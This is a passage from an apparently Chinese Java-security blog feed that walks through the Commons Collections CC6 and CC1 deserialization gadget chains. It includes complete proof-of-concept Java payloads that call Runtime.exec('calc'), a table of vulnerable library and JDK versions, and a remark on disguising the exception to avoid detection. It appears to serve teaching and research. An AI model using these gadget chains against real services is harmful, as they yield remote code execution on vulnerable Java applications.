æ–¹æ³•ï¼Œæ‰€ä»¥åœ¨åˆ›å»º <code>TiedMapEntry</code> çš„æ—¶å€™ï¼Œå°±è‡ªåŠ¨è°ƒç”¨äº† <code>getValue()</code> æœ€ç»ˆå°†é“¾å­èµ°å®Œï¼Œç„¶åå¼¹å‡ºè®¡ç®—å™¨ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601131834297.png" alt="image-20260113183403831"></p><h2 id="ä¸‰ã€æ€»ç»“"><a href="#ä¸‰ã€æ€»ç»“" class="headerlink" title="ä¸‰ã€æ€»ç»“"></a>ä¸‰ã€æ€»ç»“</h2><h3 id="1-é“¾è·¯é€»è¾‘"><a href="#1-é“¾è·¯é€»è¾‘" class="headerlink" title="1.é“¾è·¯é€»è¾‘"></a>1.é“¾è·¯é€»è¾‘</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">HashMap#</span><span class="language-bash">readObject</span></span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">TiedMapEntry#hashCode</span></span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">TiedMapEntry#getValue</span></span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">LazyMap#get</span></span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">ChainedTransformer#transform</span></span><br></pre></td></tr></table></figure><p><strong>common collection</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">org/apache/commons/collections/keyvalue/TiedMapEntry.java</span><br><span class="line">org/apache/commons/collections/map/LazyMap.java</span><br></pre></td></tr></table></figure><h3 id="2-æœ€ç»ˆpoc"><a href="#2-æœ€ç»ˆpoc" class="headerlink" title="2.æœ€ç»ˆpoc"></a>2.æœ€ç»ˆpoc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chaun0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(r);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chuan1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chuan2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">Transformer chuan3= <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">Transformer[] chuan = &#123;chaun0,chuan1,chuan2,chuan3,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">Transformer[] chuan0000 = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chuanTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chuan0000);</span><br><span class="line"></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map,chuanTransformer);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">foo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">obj2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">obj2.put(foo, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f.set(chuanTransformer, chuan);</span><br><span class="line"></span><br><span class="line">map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">serialize(obj2);</span><br><span class="line">unserialize();</span><br></pre></td></tr></table></figure><h3 id="3-ç‰ˆæœ¬é™åˆ¶"><a href="#3-ç‰ˆæœ¬é™åˆ¶" class="headerlink" title="3.ç‰ˆæœ¬é™åˆ¶"></a>3.ç‰ˆæœ¬é™åˆ¶</h3><table><thead><tr><th><strong>é™åˆ¶ç±»å‹</strong></th><th><strong>CC6 çš„æƒ…å†µ</strong></th><th><strong>å¤‡æ³¨</strong></th></tr></thead><tbody><tr><td><strong>Commons Collections 3.1 - 3.2.1</strong></td><td>âœ… <strong>å¯ç”¨</strong></td><td>é»„é‡‘åˆ©ç”¨åŒºé—´</td></tr><tr><td><strong>Commons Collections 3.2.2+</strong></td><td>âŒ <strong>ä¸å¯ç”¨</strong></td><td>é»˜è®¤ç¦ç”¨ååºåˆ—åŒ–ï¼ŒæŠ›å¼‚å¸¸</td></tr><tr><td><strong>Commons Collections 4.0</strong></td><td>âœ… <strong>å¯ç”¨</strong></td><td>éœ€è¦ä¿®æ”¹åŒ…åä¸º <code>commons-collections4</code></td></tr><tr><td><strong>Commons Collections 4.1+</strong></td><td>âŒ <strong>ä¸å¯ç”¨</strong></td><td>å½»åº•ç§»é™¤äº†åºåˆ—åŒ–æ¥å£</td></tr><tr><td><strong>JDK 8u71 ä¹‹å‰</strong></td><td>âœ… <strong>å¯ç”¨</strong></td><td>é€šæ€</td></tr><tr><td><strong>JDK 8u71 ä¹‹å (åŒ…å« JDK 11&#x2F;17)</strong></td><td>âœ… <strong>å¯ç”¨</strong></td><td><strong>è¿™æ˜¯ CC6 ç›¸æ¯” CC1 çš„æ ¸å¿ƒä¼˜åŠ¿</strong></td></tr><tr><td><strong>JEP 290 è¿‡æ»¤å™¨</strong></td><td>âŒ <strong>ä¸å¯ç”¨</strong></td><td>å¦‚æœé…ç½®äº†é»‘åå•ï¼Œä»»ä½•é“¾éƒ½ä¼šæŒ‚</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> CCé“¾ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaå®‰å…¨ </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> CCé“¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaå®‰å…¨-CC1è¿›é˜¶</title>
      <link href="/2026/01/15/CC1_plus-chain/"/>
      <url>/2026/01/15/CC1_plus-chain/</url>
      
        <content type="html"><![CDATA[<h1 id="javaå®‰å…¨-CC1è¿›é˜¶"><a href="#javaå®‰å…¨-CC1è¿›é˜¶" class="headerlink" title="javaå®‰å…¨-CC1è¿›é˜¶"></a>javaå®‰å…¨-CC1è¿›é˜¶</h1><h2 id="ä¸€ã€å®˜æ–¹CC1"><a href="#ä¸€ã€å®˜æ–¹CC1" class="headerlink" title="ä¸€ã€å®˜æ–¹CC1"></a>ä¸€ã€å®˜æ–¹CC1</h2><p><code>ysoserial</code>å®˜æ–¹é“¾ä¸º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment">Map(Proxy).entrySet()</span></span><br><span class="line"><span class="comment">AnnotationInvocationHandler.invoke()</span></span><br><span class="line"><span class="comment">LazyMap.get()</span></span><br><span class="line"><span class="comment">ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">Method.invoke()</span></span><br><span class="line"><span class="comment">Class.getMethod()</span></span><br><span class="line"><span class="comment">InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">Method.invoke()</span></span><br><span class="line"><span class="comment">Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">Method.invoke()</span></span><br><span class="line"><span class="comment">Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Requires:</span></span><br><span class="line"><span class="comment">commons-collections</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h2 id="äºŒã€ä¸»è¦é€»è¾‘"><a href="#äºŒã€ä¸»è¦é€»è¾‘" class="headerlink" title="äºŒã€ä¸»è¦é€»è¾‘"></a>äºŒã€ä¸»è¦é€»è¾‘</h2><p>å®˜æ–¹<code>CC1</code>æ²¡æœ‰ä½¿ç”¨æˆ‘ä»¬ä¸€å¼€å§‹çš„ç±»ï¼Œè€Œæ˜¯ç”¨åˆ°äº†<code>LazyMap.java</code>è¿™ä¸ªç±»æ–‡ä»¶</p><ul><li><strong>å…¥å£ç±»</strong><code>readObject</code>ç±»æ²¡æœ‰å˜ï¼Œä¾æ—§æ˜¯<code>sun.reflect.annotation.AnnotationInvocationHandler</code>è¿™ä¸ªç±»ä¸‹çš„<code>readObject</code>æ–¹æ³•</li><li><strong>æœ€ç»ˆå±é™©è°ƒç”¨ç»“æŸ</strong>ä¹Ÿæ²¡æœ‰æ”¹å˜ï¼Œä¾æ—§æ˜¯<code>ChainedTransformer.transform()</code>è¿™ä¸ªé“¾å¼æ–¹æ³•æ‰§è¡Œå‘½ä»¤</li></ul><p>æ”¹å˜çš„æ˜¯ä¸­é—´é€»è¾‘<code>lazyMapçš„è°ƒç”¨</code></p><p><strong>å…·ä½“è¿‡ç¨‹å¦‚ä¸‹ï¼ˆå±é™©åˆ°å…¥å£ï¼‰</strong></p><h3 id="1-ChainedTransformer-transformæ–¹æ³•çš„è°ƒç”¨"><a href="#1-ChainedTransformer-transformæ–¹æ³•çš„è°ƒç”¨" class="headerlink" title="1.ChainedTransformer#transformæ–¹æ³•çš„è°ƒç”¨"></a>1.<code>ChainedTransformer#transform</code>æ–¹æ³•çš„è°ƒç”¨</h3><p>è¿™é‡Œï¼Œå®˜æ–¹é€‰å–äº†<code>org/apache/commons/collections/map/LazyMap.java</code>è¿™ä¸ªç±»ä¸­çš„<code>get</code>æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601102202286.png" alt="image-20260110220224169"></p><p><strong>è¿™ä¸ªæ–¹æ³•çš„æ¡ä»¶ä¸€èˆ¬éƒ½æ˜¯å®¹æ˜“æ»¡è¶³ï¼Œåªè¦æ²¡æœ‰keyå¯¹åº”çš„valueï¼Œå¦‚æœæ»¡è¶³è¿™ä¸ªæ¡ä»¶å°±ä¼šæ¥ç€è°ƒç”¨ factory çš„ transform æ–¹æ³•ï¼Œè€Œè¿™ä¸ªtransformç±»æ˜¯å¯æ§çš„</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601102205478.png" alt="image-20260110220548417"></p><p>åˆ©ç”¨æ­¤æ–¹æ³•åˆ›å»ºLazyMapå¯¹è±¡æ—¶ï¼Œä¼ å…¥ç¬¬äºŒä¸ªå‚æ•°ä¾¿å¯ä»¥æ§åˆ¶ä¸º<strong>new ChainedTransformer(chuan) <strong>è¿™ä¸ª</strong>æ¶æ„ç±»</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chuan));</span><br></pre></td></tr></table></figure><h3 id="2-lazyMap-getæ–¹æ³•çš„è°ƒç”¨"><a href="#2-lazyMap-getæ–¹æ³•çš„è°ƒç”¨" class="headerlink" title="2.lazyMap#getæ–¹æ³•çš„è°ƒç”¨"></a>2.<code>lazyMap#get</code>æ–¹æ³•çš„è°ƒç”¨</h3><p>é€šè¿‡è¿½æº¯ï¼Œæ‰¾åˆ°äº†<code>sun/reflect/annotation/AnnotationInvocationHandler.java</code>ç±»ä¸‹<code>invoke</code>æ–¹æ³•ä¼š<strong>è°ƒç”¨ä¼ å…¥ç±»ï¼ˆå¯æ§ï¼‰çš„get æ–¹æ³•</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601102213836.png" alt="image-20260110221347588"></p><p><strong>è¿™é‡Œæˆ‘ä»¬é€šè¿‡åå°„æ„é€  sun.reflect.annotation.AnnotationInvocationHandler ç±»æ—¶ï¼Œæ„é€ å™¨ä¼ ç¬¬äºŒä¸ªå‚æ•°ä¸º lazyMap å¯¹è±¡å³å¯</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br></pre></td></tr></table></figure><h3 id="3-AnnotationInvocationHandler-invokeæ–¹æ³•çš„è°ƒç”¨"><a href="#3-AnnotationInvocationHandler-invokeæ–¹æ³•çš„è°ƒç”¨" class="headerlink" title="3.AnnotationInvocationHandler#invokeæ–¹æ³•çš„è°ƒç”¨"></a>3.<code>AnnotationInvocationHandler#invoke</code>æ–¹æ³•çš„è°ƒç”¨</h3><p>æ³¨æ„åˆ°æ­¤ç±»å®ç°äº†<code>InvocationHandler</code>æ¥å£ï¼Œäºæ˜¯å¯ä»¥ä½œä¸ºåŠ¨æ€ä»£ç†æ—¶ï¼Œ<strong>å¤„ç†è¢«ä»£ç†å¯¹è±¡çš„ç±»</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601102218403.png" alt="image-20260110221801296"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,h);</span><br></pre></td></tr></table></figure><p><strong>æˆ‘ä»¬åœ¨è°ƒç”¨ lazyMap ä¸­çš„æ–¹æ³•æ—¶ï¼Œä¾¿ä¼šå…ˆè°ƒç”¨ InvocationHandler ä¸­çš„é€»è¾‘ï¼Œä¹Ÿå°±ä¼šè§¦å‘ invoke æ–¹æ³•ä¸­çš„ get æ–¹æ³•</strong></p><p><strong>å…·ä½“é€»è¾‘</strong></p><ul><li><p><strong>åˆ›å»ºæ¶æ„Mapé›†åˆ</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chuan));</span><br></pre></td></tr></table></figure></li><li><p><strong>åˆ›å»ºä»£ç†åˆ©ç”¨æ—¶çš„é‡å†™ invoke æ–¹æ³•çš„ç»§æ‰¿ InvocationHandler çš„ç±»</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¸æˆ‘ä»¬ä¹‹å‰åˆ›å»ºä»£ç†ç±»æ—¶ç›¸åŒï¼Œä¸åŒçš„æ˜¯æˆ‘ä»¬<strong>ä¸éœ€è¦</strong>æ‰‹åŠ¨åˆ›å»ºï¼Œè¿™é‡Œç›´æ¥ä½¿ç”¨<code>AnnotationInvocationHandler#invoke</code>ç±»ç›´æ¥ä½œä¸ºåˆ›å»ºä»£ç†å¯¹è±¡æ—¶çš„<strong>ç¬¬ä¸‰ä¸ªå‚æ•°ä¹Ÿå°±æ˜¯æ‹¦æˆªå™¨</strong></p></li><li><p><strong>åˆ›å»ºä»£ç†ç±»</strong></p><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨<code>lazyMap</code>çš„ç±»åŠ è½½å™¨ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå› ä¸ºæˆ‘ä»¬è¦ä»£ç†å®ƒå˜›ï¼Œå®ç°çš„æ¥å£ä¸º Map ï¼Œæœ€ç»ˆç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºå¤„ç†ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,h);</span><br></pre></td></tr></table></figure></li><li><p><strong>ä»£ç†è§¦å‘ç‚¹</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601111653024.png" alt="image-20260111165332836"></p><p><strong>AnnotationInvocationHandler ç±»åœ¨ååºåˆ—åŒ–æ—¶ï¼Œä¼šè°ƒç”¨ readObject æ–¹æ³•ï¼Œè¿›è€Œè°ƒç”¨ memberValues.entrySet() æ–¹æ³•ï¼Œéšåå˜èµ°åˆ°äº†åŠ¨æ€ä»£ç†é‡Œé¢ï¼Œå› æ­¤æˆ‘ä»¬æ„é€ ä½¿å¾— memberValues ä¸ºmapProxy å¯¹è±¡</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj2</span> <span class="operator">=</span> constructor.newInstance(Override.class,mapProxy);</span><br></pre></td></tr></table></figure></li></ul><p><strong>ç”±æ­¤ï¼Œé“¾å¼è°ƒç”¨ç»“æŸï¼Œå®ç°æ¶æ„ç±»çš„è°ƒç”¨</strong></p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601111658894.png" alt="image-20260111165819741" style="zoom:40%;" /><h2 id="ä¸‰ã€poc"><a href="#ä¸‰ã€poc" class="headerlink" title="ä¸‰ã€poc"></a>ä¸‰ã€poc</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chaun0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(r);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chuan1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chuan2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">Transformer chuan3= <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">Transformer[] chuan = &#123;chaun0,chuan1,chuan2,chuan3&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chuan));</span><br><span class="line"></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,h);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj2</span> <span class="operator">=</span> constructor.newInstance(Override.class,mapProxy);</span><br><span class="line"></span><br><span class="line">serialize(obj2);</span><br><span class="line">unserialize();</span><br></pre></td></tr></table></figure><h3 id="1-é“¾è·¯å›é¡¾"><a href="#1-é“¾è·¯å›é¡¾" class="headerlink" title="1.é“¾è·¯å›é¡¾"></a>1.<strong>é“¾è·¯å›é¡¾</strong></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">AnnotationInvocationHandler#</span><span class="language-bash">readObject()</span></span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">memberValues.entrySet()1.memberValues=mapProxy</span></span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">mapProxy#entrySet()</span></span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">AnnotationInvocationHandler#invoke()</span></span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">memberValues.get(member)-&gt;mapProxy#get(member)</span></span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">factory#transform(key)     2.factory=ChainedTransformer(chuan)</span></span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">ChainedTransformer(chuan)#transform(key)</span></span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">InvokerTransformer#transform()</span></span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">Runtime.<span class="built_in">exec</span>()</span></span><br></pre></td></tr></table></figure><h3 id="2-é¢å¤–"><a href="#2-é¢å¤–" class="headerlink" title="2.é¢å¤–"></a>2.<strong>é¢å¤–</strong></h3><ul><li><p><strong>å®˜æ–¹åœ¨æœ€åæ‰ä¿®æ”¹äº† ChainedTransformer(chuan)#transform(key) ä¸­çš„ chuan å‚æ•°ï¼Œé˜²æ­¢ï¼Œåœ¨åºåˆ—åŒ–ä¹‹å‰è°ƒç”¨Mapçš„æŸäº›æ–¹æ³•å¯¼è‡´å…ˆè¡Œæ‰§è¡Œå‘½ä»¤ï¼Œé€ æˆå¹²æ‰°</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601111725823.png" alt="image-20260111172507620"></p></li><li><p>**å®˜æ–¹åœ¨chainé“¾çš„æœ€ååŠ å…¥äº†ä¸€ä¸ª new ConstantTransformer(1) } **</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601111745649.png" alt="image-20260111174553580"></p><p><strong>è¿™ä¹ˆåšçš„ç›®çš„ï¼Œç†è®ºä¸Šæ˜¯ä¸ºäº†é˜²æ­¢æ¶æ„ç±»è¢«æ£€æµ‹åˆ°</strong></p><ul><li><p>æ²¡åšä¹‹å‰å¼‚å¸¸ä¿¡æ¯ä¸º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.ClassCastException: java.lang.ProcessImpl cannot be cast to java.util.Set</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ª<strong>java.lang</strong></p></li><li><p>æ·»åŠ ä¹‹å</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601111748386.png" alt="image-20260111174833251"></p><p><strong>å˜ä¸ºäº† Integer</strong></p></li></ul></li></ul><h3 id="3-å®Œç¾"><a href="#3-å®Œç¾" class="headerlink" title="3.å®Œç¾"></a>3.å®Œç¾</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chaun0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(r);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chuan1</span> <span 